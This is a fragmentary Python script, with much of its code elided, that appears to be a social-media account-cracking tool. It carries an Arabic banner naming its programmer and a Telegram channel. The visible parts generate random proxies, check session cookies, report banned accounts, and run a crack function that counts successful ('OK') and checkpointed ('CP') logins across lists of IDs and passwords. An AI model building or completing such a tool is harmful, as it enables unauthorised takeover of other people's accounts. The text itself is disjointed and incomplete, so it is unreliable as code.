...
proxies = [generate_random_proxy() for _ in range(num_proxies)]

print("Randomly generated proxies:")
...
SDMCOK = generate_random_word(75)
...
text = """
============================================================
 الـمبـرمـج مــحـمـد الـمـوسوي : @M_T_F 
 
 قـناتي : https://t.me/py_1hon<اضـفط هنا لدخول قناتي>
============================================================
"""
...
CON = sol()
os.system('clear')
cetak(nel('\t•  لاتنسى صور الصـيد : @M_T_F  •'))
	...
	try:
		...
		with requests.Session() as rsn:
			try:
				...
				print('فشل تحقق من كوكيز قم ب تبديلة')
		...
		print(f'  %s[%sx%s]%s فشل تسجيل الدخول هذا الحساب محظور... !!%s'%(x,k,x,m,x))
		print(e)
		exit()
def bot():
	try:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [𓆩𝑆𝐷𝑀 𝑉𝐼𝑃𓆪] %s/%s » [OK] %s » [CP] %s » %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
